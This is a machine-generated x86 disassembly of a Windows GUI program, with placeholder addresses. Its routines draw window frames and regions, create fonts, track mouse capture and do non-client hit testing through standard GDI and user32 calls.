call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_4473e7
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4518a5
push ebp
mov ebp esp
sub esp 0x10
push edi
push 0x8
call sub_45565c
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_4556cc
push [ rw-data ]
call sub_44774c
pop edi
leave
retn
xor edx edx
lea eax [ ebp - 0x10 ]
mov ecx edx
mov edi 0x5555
and ecx 0x1
shl edi cl
inc edx
mov [ eax ] di
inc eax
inc eax
cmp edx 0x8
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x1
push 0x8
push 0x8
call [ CreateBitmap@IAT ]
mov edi eax
test edi edi
je r-xdata
push edi
call [ CreatePatternBrush@IAT ]
push edi
mov [ rw-data ] eax
call [ DeleteObject@IAT ]
sub_451918
mov eax sub_464030
call sub_42dc88
sub esp 0x38
push ebx
push esi
push edi
mov edi ecx
lea ecx [ ebp - 0x2c ]
call sub_42660f
mov esi r--data
mov [ ebp - 0x2c ] esi
xor ebx ebx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] ebx
call sub_42660f
mov [ ebp - 0x1c ] esi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_42660f
mov [ ebp - 0x14 ] esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call [ CreateRectRgnIndirect@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_447761
push [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
call [ CopyRect@IAT ]
mov eax [ ebp + 0x10 ]
neg eax
push eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ InflateRect@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ IntersectRect@IAT ]
lea eax [ ebp - 0x44 ]
push eax
call [ CreateRectRgnIndirect@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_447761
push ebx
push ebx
push ebx
push ebx
call [ CreateRectRgn@IAT ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_447761
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
neg eax
sbb eax eax
push 0x3
and eax [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
push eax
and ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x28 ]
call [ CombineRgn@IAT ]
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp [ ebp + 0x24 ] ebx
jne r-xdata
call sub_4518a5
mov [ ebp + 0x20 ] eax
lea ecx [ ebp - 0x24 ]
call sub_42660f
mov [ ebp - 0x24 ] esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x3
call sub_42660f
mov [ ebp - 0x34 ] esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x4
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x20 ]
mov [ ebp + 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x24 ]
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
call [ CreateRectRgn@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_447761
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push [ ebp - 0x18 ]
call [ SetRectRgn@IAT ]
lea eax [ ebp - 0x44 ]
push esi
push eax
call [ CopyRect@IAT ]
mov eax [ ebp + 0x1c ]
neg eax
push eax
mov eax [ ebp + 0x18 ]
neg eax
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ InflateRect@IAT ]
lea eax [ ebp - 0x44 ]
push esi
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ IntersectRect@IAT ]
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
push [ ebp - 0x10 ]
call [ SetRectRgn@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
neg eax
sbb eax eax
push 0x3
and eax [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
push eax
and ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x20 ]
call [ CombineRgn@IAT ]
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x24 ]
mov eax [ eax + 0x4 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
cmp [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x34 ]
jne r-xdata
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
call [ CreateRectRgn@IAT ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_447761
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
neg eax
sbb eax eax
push 0x3
and eax [ ebp - 0x28 ]
neg ecx
sbb ecx ecx
push eax
and ecx [ ebp - 0x20 ]
push ecx
push [ ebp - 0x30 ]
call [ CombineRgn@IAT ]
push eax
mov ecx edi
call sub_447179
mov eax [ edi ]
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push [ ebp + 0x20 ]
mov ecx edi
call sub_446db3
mov ecx [ ebp - 0x3c ]
mov esi eax
mov eax [ ebp - 0x38 ]
sub ecx [ ebp - 0x44 ]
sub eax [ ebp - 0x40 ]
push 0x5a0049
push eax
push ecx
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
push [ edi + 0x4 ]
call [ PatBlt@IAT ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call sub_447179
mov eax [ edi ]
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push [ ebp + 0x24 ]
mov ecx edi
call sub_446db3
mov ecx [ ebp - 0x3c ]
mov esi eax
mov eax [ ebp - 0x38 ]
sub ecx [ ebp - 0x44 ]
sub eax [ ebp - 0x40 ]
push 0x5a0049
push eax
push ecx
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
push [ edi + 0x4 ]
call [ PatBlt@IAT ]
push esi
mov ecx edi
call sub_446db3
push ebx
mov ecx edi
call sub_447179
mov esi r--data
mov [ ebp - 0x34 ] esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x5
call sub_4477b8
mov [ ebp - 0x24 ] esi
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x6
call sub_4477b8
mov [ ebp - 0x14 ] esi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x7
call sub_4477b8
mov [ ebp - 0x1c ] esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
call sub_4477b8
mov [ ebp - 0x2c ] esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x9
call sub_4477b8
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x20
push esi
mov ecx edi
call sub_446db3
sub_451c1c
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
push [ ebp + 0x18 ]
push [ esi + 0x4 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
add eax edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
add ecx eax
xor eax eax
mov [ ebp - 0x4 ] ecx
push eax
push eax
lea ecx [ ebp - 0x10 ]
push eax
push ecx
push 0x2
push eax
push eax
push [ esi + 0x4 ]
call [ ExtTextOutA@IAT ]
pop esi
leave
retn 0x14
sub_451c68
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x18 ]
lea eax [ esi - 0x1 ]
push 0x1
push eax
push ebx
push [ ebp + 0x8 ]
call sub_451c1c
mov edi [ ebp + 0x14 ]
push [ ebp + 0x18 ]
mov ecx [ ebp - 0x4 ]
lea eax [ edi - 0x1 ]
push eax
push 0x1
push ebx
push [ ebp + 0x8 ]
call sub_451c1c
push [ ebp + 0x1c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax esi
push edi
push 0xffffffff
push ebx
push eax
call sub_451c1c
push [ ebp + 0x1c ]
mov ecx [ ebp - 0x4 ]
add ebx edi
push 0xffffffff
push esi
push ebx
push [ ebp + 0x8 ]
call sub_451c1c
pop edi
pop esi
pop ebx
leave
retn 0x18
sub_451d03
mov eax sub_464af6
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_44f1fe
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0xc8 ] eax
and [ esi + 0xc4 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_451d69
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_451d69
mov eax sub_464b08
call sub_42dc88
sub esp 0xa4
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push 0xa
call sub_45565c
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_45357b
mov eax [ eax + 0xc ]
push 0x7912
push eax
call [ LoadBitmapA@IAT ]
lea ecx [ ebp - 0x78 ]
mov [ rw-data ] eax
push ecx
push 0x18
push eax
call [ GetObjectA@IAT ]
test eax eax
je r-xdata
push esi
push edi
push ebx
lea ecx [ ebp - 0x24 ]
call sub_4474b9
mov eax [ rw-data ]
mov esi [ SelectObject@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push 0x3c
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_42dc30
add esp 0xc
mov [ ebp - 0x49 ] 0x1
mov [ ebp - 0x50 ] 0x190
push 0x1
pop eax
sub eax [ rw-data ]
push 0x2a
mov [ ebp - 0x60 ] eax
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x74 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x70 ]
mov [ rw-data ] eax
xor edi edi
push eax
push [ ebp - 0x20 ]
call esi
mov edi eax
jmp r-xdata
push r--data
push r--data
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
pop edi
pop esi
je r-xdata
push edi
push [ ebp - 0x20 ]
call esi
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp - 0x1c ]
call [ GetTextMetricsA@IAT ]
cmp edi ebx
mov [ ebp - 0x10 ] eax
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
call [ CreateFontIndirectA@IAT ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
mov [ ebp - 0x45 ] 0x20
lea eax [ ebp - 0x44 ]
push eax
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x60 ]
push eax
push 0xf233
call sub_447831
test eax eax
jne r-xdata
push rw-data
call sub_4479eb
mov eax [ ebp - 0xb0 ]
sub eax [ ebp - 0xa4 ]
cmp eax [ rw-data ]
jle r-xdata
push 0xa
call sub_4556cc
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
call sub_44752b
sub_451ed5
mov eax sub_464b2a
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_43effe
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc8 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44f2dc
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_451f1f
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
push [ ebp + 0x10 ]
lea ecx [ ebx + 0xc8 ]
call sub_4422d1
mov eax [ ebp + 0xc ]
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x1c ]
cmp ecx edi
je r-xdata
push edi
push edi
push 0x7f00
push edi
call [ LoadCursorA@IAT ]
push eax
push 0x8
call sub_43f3f3
mov ecx [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x20 ]
mov edx [ ecx + 0x4 ]
mov esi [ ecx ]
push edi
mov edi [ ecx + 0xc ]
mov ecx [ ecx + 0x8 ]
sub edi edx
sub ecx esi
push edi
push ecx
push edx
push esi
mov ecx ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_43ed0f
pop edi
pop esi
pop ebx
pop ebp
retn 0x1c
mov edi [ ecx + 0x1c ]
sub_451f92
push ebp
mov ebp ecx
call sub_43e71a
test eax eax
je r-xdata
pop ebp
retn 0x4
mov ecx ebp
call sub_44163f
test ah 0x1
je r-xdata
push 0x1
pop eax
push ebx
push esi
push edi
mov ecx ebp
call sub_43fd7e
mov edi eax
call [ GetForegroundWindow@IAT ]
push eax
call sub_43e7b3
mov ebx [ SendMessageA@IAT ]
mov esi eax
cmp edi esi
je r-xdata
push 0x1
pop eax
push [ edi + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_43e7b3
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x40
push 0x36d
push [ esi + 0x1c ]
call ebx
test eax eax
jne r-xdata
neg eax
sbb eax eax
push 0x0
and al 0xfc
add eax 0x8
push eax
push 0x36d
push [ ebp + 0x1c ]
call ebx
pop edi
pop esi
pop ebx
sub_45201a
cmp [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
je r-xdata
push esi
call sub_44f9cb
and [ esi + 0x2d ] 0xfd
push 0x1
pop eax
pop esi
retn 0x4
mov eax [ esi + 0x20 ]
test ah 0x6
je r-xdata
test [ esi + 0x22 ] 0xc0
je r-xdata
or eax 0x40000
mov [ esi + 0x20 ] eax
or [ esi + 0x2c ] 0x80
sub_452053
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi ecx
call sub_43e71a
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
sub ecx [ ebp - 0x18 ]
pop esi
sub ecx [ ebp - 0x10 ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ eax + 0x1c ] ecx
leave
retn 0x4
sub_45209b
push esi
mov esi ecx
call sub_44163f
test ah 0x1
jne r-xdata
test [ esi + 0x25 ] 0x2
je r-xdata
xor edx edx
cmp [ rw-data ] edx
je r-xdata
push 0x1
pop eax
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
lea eax [ esi + 0xc4 ]
cmp [ eax ] ecx
je r-xdata
mov ecx esi
call sub_43e71a
jmp r-xdata
pop esi
retn 0x4
push edx
push edx
push 0x85
mov [ eax ] ecx
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_4520ec
cmp [ rw-data ] 0x0
push esi
je r-xdata
push edi
call sub_44163f
mov edi eax
test edi 0x40600
je r-xdata
call sub_43e71a
jmp r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x6
call esi
neg eax
push eax
push 0x5
mov esi [ GetSystemMetrics@IAT ]
push 0x21
call esi
neg eax
push eax
push 0x20
jmp r-xdata
pop esi
retn 0x8
mov eax [ rw-data ]
add [ esi + 0x4 ] eax
call esi
mov esi [ esp + 0x14 ]
neg eax
push eax
push esi
call [ InflateRect@IAT ]
test edi 0xc00000
pop edi
je r-xdata
sub_452152
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0xc ] edi
call sub_44163f
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x21
call esi
mov ebx eax
push 0x20
mov [ ebp - 0x8 ] ebx
call esi
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
je r-xdata
push [ ebp + 0xc ]
mov edi [ PtInRect@IAT ]
lea eax [ ebp - 0x28 ]
push [ ebp + 0x8 ]
push eax
call edi
test eax eax
jne r-xdata
mov ecx edi
call sub_43e71a
cmp [ rw-data ] 0x0
push 0x2
mov esi eax
pop edi
je r-xdata
push 0x6
call esi
mov ebx eax
push 0x5
mov [ ebp - 0x10 ] ebx
call esi
mov esi eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x64 ] eax
lea eax [ ebp - 0x6c ]
push eax
push 0x0
call sub_4520ec
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ CopyRect@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x38 ]
push [ ebp + 0x8 ]
push eax
call edi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
cmp esi 0xa
jb r-xdata
test [ ebp - 0x3 ] 0x10
je r-xdata
test [ ebp - 0x4 ] 0x40600
je r-xdata
push 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp esi 0x4
jne r-xdata
cmp esi 0x11
jbe r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ rw-data ]
push [ ebp + 0xc ]
add ebx eax
lea eax [ ebp - 0x28 ]
push [ ebp + 0x8 ]
add ebx [ ebp - 0x24 ]
push eax
mov [ ebp - 0x1c ] ebx
call edi
test eax eax
je r-xdata
lea eax [ esi + esi * 2 ]
mov esi [ ebp - 0x8 ]
mov ecx eax
mov eax [ rw-data ]
sub eax ecx
lea ecx [ ebx + ebx ]
add eax [ ebp - 0x18 ]
mov edx ecx
mov ecx esi
sub ecx edx
mov edx [ ebp - 0x24 ]
add ecx [ rw-data ]
add edx esi
cmp [ ebp + 0xc ] edx
jge r-xdata
pop eax
mov eax esi
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
push edi
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov esi edi
push 0xfffffffe
mov eax [ rw-data ]
mov ecx [ ebp - 0x28 ]
lea eax [ eax + ecx - 0x2 ]
cmp [ ebp + 0x8 ] eax
jge r-xdata
mov edx [ ebp - 0x1c ]
mov ebx edx
sub ebx esi
cmp [ ebp + 0xc ] ebx
jl r-xdata
test [ ebp - 0x3 ] 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
neg ebx
neg eax
push ebx
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ InflateRect@IAT ]
test [ ebp - 0x3 ] 0x2
je r-xdata
mov eax edi
jmp r-xdata
push 0x2
jmp r-xdata
test [ ebp - 0x2 ] 0x8
je r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
add esi eax
cmp [ ebp + 0x8 ] esi
jge r-xdata
test [ ebp - 0x3 ] 0x2
je r-xdata
mov ecx [ ebp - 0x28 ]
add ecx eax
cmp [ ebp + 0x8 ] ecx
jg r-xdata
push 0xc
jmp r-xdata
mov eax esi
sub eax 0x4
je r-xdata
push 0x3
jmp r-xdata
mov esi [ ebp - 0x20 ]
sub esi eax
cmp [ ebp + 0x8 ] esi
jl r-xdata
test [ ebp - 0x3 ] 0x2
je r-xdata
mov ecx [ ebp - 0x28 ]
add ecx eax
cmp [ ebp + 0x8 ] ecx
jg r-xdata
push 0xf
jmp r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx eax
xor eax eax
cmp [ ebp + 0x8 ] ecx
setl al
dec eax
and eax 0x2
add eax 0xc
jmp r-xdata
push 0xd
jmp r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebp - 0x1c ]
setle al
dec eax
and eax 0x4
sub eax 0x9
je r-xdata
mov ecx [ ebp - 0x8 ]
neg ecx
neg eax
push ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ InflateRect@IAT ]
mov ebx [ ebp - 0x10 ]
test [ ebp - 0x3 ] 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
add eax ecx
cmp [ ebp + 0xc ] eax
jle r-xdata
push 0xa
jmp r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx eax
xor eax eax
cmp [ ebp + 0x8 ] ecx
setl al
dec eax
and eax 0x2
add eax 0xf
jmp r-xdata
push 0x10
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebp - 0x24 ]
setge al
dec eax
and eax edi
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x24 ]
add eax ecx
cmp [ ebp + 0xc ] eax
jg r-xdata
push 0xb
jmp r-xdata
sub edx ecx
xor eax eax
cmp [ ebp + 0xc ] edx
setl al
dec eax
and eax 0x6
add eax 0xa
jmp r-xdata
add eax 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebp - 0x24 ]
setl al
jmp r-xdata
sub eax edi
je r-xdata
sub edx ecx
xor eax eax
cmp [ ebp + 0xc ] edx
setl al
dec eax
and eax 0x6
add eax 0xb
push 0xe
add eax 0xb
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebp - 0x1c ]
setle al
dec eax
and eax 0x5
dec eax
je r-xdata
sub_452451
cmp [ rw-data ] 0x0
push esi
mov esi ecx
jne r-xdata
mov ecx esi
call sub_43e71a
cmp [ esp + 0x8 ] 0x3
jne r-xdata
push 0x1
pop eax
push [ esi + 0x1c ]
mov [ esi + 0xbc ] eax
mov [ esi + 0xc0 ] eax
call [ SetCapture@IAT ]
push eax
call sub_43e7b3
mov ecx esi
call sub_45257d
jmp r-xdata
pop esi
retn 0xc
sub_452496
push esi
mov esi ecx
push edi
cmp [ esi + 0xbc ] 0x0
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x1c ]
call [ ClientToScreen@IAT ]
call [ GetCapture@IAT ]
push eax
call sub_43e7b3
cmp eax esi
je r-xdata
call sub_43e71a
jmp r-xdata
push [ esp + 0x14 ]
mov edi [ esi + 0xc0 ]
mov ecx esi
push [ esp + 0x14 ]
call sub_452152
sub eax 0x3
neg eax
sbb eax eax
inc eax
cmp eax edi
je r-xdata
and [ esi + 0xbc ] 0x0
push 0x0
push 0x0
push 0x85
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
pop edi
pop esi
retn 0xc
xor eax eax
mov ecx esi
test edi edi
sete al
mov [ esi + 0xc0 ] eax
call sub_45257d
sub_45251d
push esi
mov esi ecx
push edi
cmp [ esi + 0xbc ] 0x0
lea edi [ esi + 0xbc ]
jne r-xdata
call [ ReleaseCapture@IAT ]
and [ edi ] 0x0
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x1c ]
call [ ClientToScreen@IAT ]
push [ esp + 0x14 ]
mov ecx esi
push [ esp + 0x14 ]
call sub_452152
cmp eax 0x3
jne r-xdata
call sub_43e71a
jmp r-xdata
pop edi
pop esi
retn 0xc
mov ecx esi
call sub_45257d
push 0x0
push 0x0
push 0x10
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_45257d
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ GetSystemMetrics@IAT ]
push edi
mov [ ebp - 0x8 ] ecx
push 0x6
call esi
push 0x5
mov [ ebp - 0x4 ] eax
call esi
push 0x21
mov edi eax
call esi
push 0x20
mov ebx eax
call esi
mov esi eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] edi
sub eax edi
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
call sub_44163f
test eax 0x40600
je r-xdata
mov edi [ ebp - 0x8 ]
push [ edi + 0x1c ]
call [ GetWindowDC@IAT ]
push eax
call sub_446c0a
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ InvertRect@IAT ]
push [ esi + 0x4 ]
push [ edi + 0x1c ]
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub ebx [ ebp - 0x4 ]
sub esi edi
lea eax [ ebp - 0x18 ]
push ebx
push esi
push eax
call [ OffsetRect@IAT ]
sub_452615
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ CopyRect@IAT ]
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call ebx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
add eax ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ FillRect@IAT ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0x4 ]
call esi
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0x4 ]
call esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
add [ ebp - 0x10 ] eax
sub [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0x4 ]
call esi
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
sub eax ebx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0x4 ]
call esi
pop edi
pop esi
pop ebx
leave
retn 0x14
mov eax [ eax + 0x4 ]
sub_4526d2
mov eax sub_464b94
call sub_42dc88
sub esp 0xac
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
mov esi ecx
mov [ ebp - 0x50 ] esi
je r-xdata
push esi
lea ecx [ ebp - 0x44 ]
call sub_44756d
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_44163f
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
neg eax
neg ecx
push eax
lea eax [ ebp - 0x28 ]
push ecx
push eax
call [ OffsetRect@IAT ]
mov [ ebp - 0x48 ] edi
mov edi r--data
mov [ ebp - 0x4c ] edi
mov ebx [ GetSysColor@IAT ]
push 0x6
mov [ ebp - 0x4 ] 0x1
call ebx
mov esi [ CreateSolidBrush@IAT ]
push eax
call esi
push eax
lea ecx [ ebp - 0x4c ]
call sub_447761
and [ ebp - 0x5c ] 0x0
mov [ ebp - 0x60 ] edi
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + 0xc4 ]
neg eax
sbb eax eax
add eax 0xb
push eax
call ebx
push eax
call esi
push eax
lea ecx [ ebp - 0x60 ]
call sub_447761
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x58 ] edi
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ eax + 0xc4 ]
neg eax
sbb eax eax
add eax 0x3
push eax
call ebx
push eax
call esi
push eax
lea ecx [ ebp - 0x58 ]
call sub_447761
mov esi [ GetSystemMetrics@IAT ]
push 0x6
call esi
push 0x5
mov [ ebp - 0x10 ] eax
call esi
push 0x21
mov [ ebp - 0x14 ] eax
call esi
push 0x20
mov edi eax
call esi
test [ ebp - 0x30 ] 0x40600
mov esi eax
je r-xdata
call sub_43e71a
jmp r-xdata
test [ ebp - 0x2e ] 0xc0
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_452615
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
neg eax
neg ecx
push eax
lea eax [ ebp - 0x28 ]
push ecx
push eax
call [ InflateRect@IAT ]
lea eax [ ebp - 0x60 ]
push eax
mov eax edi
sub eax [ ebp - 0x10 ]
push eax
mov eax esi
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_452615
mov eax [ ebp - 0x10 ]
lea ecx [ eax + eax ]
mov eax edi
